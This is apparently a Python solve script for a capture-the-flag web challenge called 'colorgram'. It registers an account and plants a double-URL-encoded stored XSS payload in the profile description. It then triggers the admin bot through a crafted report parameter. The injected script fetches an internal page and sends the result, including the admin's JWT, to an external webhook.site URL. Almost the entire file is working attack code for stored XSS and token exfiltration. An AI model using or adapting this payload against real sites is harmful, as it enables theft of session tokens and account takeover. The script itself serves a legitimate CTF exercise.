import requests
import os

CHALLENGE_URL = os.environ.get("URL", "http://colorgram.challs.srdnlen.it")

# Insert your webhook here
WEBHOOK_URL = "https://webhook.site/e9d19575-4ab6-404e-9bac-36dd66128449"

# remember / at the end of the name
username = "sos/"
password = "SrdnlenBestTeam"
mail = "srdnlen@thebest"

# If false it will perform the registration for you, otherwise it will just log in
already_registered = False

# < and > will get url encoded 2 times, the payload will be sent as an array (description[]) automagically (line 36)
payload_description = """<iframe srcdoc='<script src="data:text/javascript,fetch(`http://colorgram-app/login.php`,{method:`POST`}).then(r=>r.text()).then(d=>location=`%s?c=${d}`);"></script>'></iframe>""" % WEBHOOK_URL

payload_color = f"%250CoNload=window.open((/account.php?name={username}))"

session = requests.session()


def register(username, password, email):
    url = f"{CHALLENGE_URL}/register.php"
    data = {"username": username, "email": email,
            "password": password, "description": "srdnlenisthebestctfteam"}
    return session.post(url, data=data, allow_redirects=False)


def login(username, password):
    url = f"{CHALLENGE_URL}/login.php"
    data = {"username": username, "password": password}
    return session.post(url, data=data, allow_redirects=False)


def change_description(username, new_description):
    url = f"{CHALLENGE_URL}/description.php?name={username}"
    data = {"description[]": new_description}
    # No data=data so that the description[] gets interpreted correctly
    return session.post(url, data, allow_redirects=False)


def report_color_to_admin(username, color):
    url = f"{CHALLENGE_URL}/report.php?name={username}"
    data = {"admin_request": color}
    return session.post(url, data=data, allow_redirects=False)


def main():
    global payload_description
    if (already_registered):
        print("Logging in...")
        print(login(username, password).text)
    else:
        print("Registering...")
        print(register(username, password, mail).text)

    # double url encode char and make list
    payload_description = payload_description.replace("<", "%253C")
    payload_description = payload_description.replace(">", "%253E")
    print("Changing description...")
    print(change_description(username, payload_description).text)
    print("Reporting color to admin...")
    print(report_color_to_admin(username, payload_color).text)
    print("Now check your webhook, get the jwt inside the request and decode it (https://jwt.io/)")


if __name__ == "__main__":
    main()
